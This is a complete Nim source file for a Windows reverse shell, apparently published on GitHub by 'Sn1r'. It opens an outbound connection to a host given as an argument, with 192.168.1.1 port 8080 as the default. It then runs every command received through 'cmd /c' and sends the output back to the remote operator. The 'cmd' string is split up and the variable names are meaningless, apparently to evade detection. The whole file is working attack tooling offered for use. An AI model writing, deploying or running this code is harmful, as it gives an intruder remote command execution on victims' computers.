#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = if paramCount() >= 1: paramStr(1) else: "192.168.1.1"
  v2 = if paramCount() >= 2: paramStr(2) else: "8080"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close
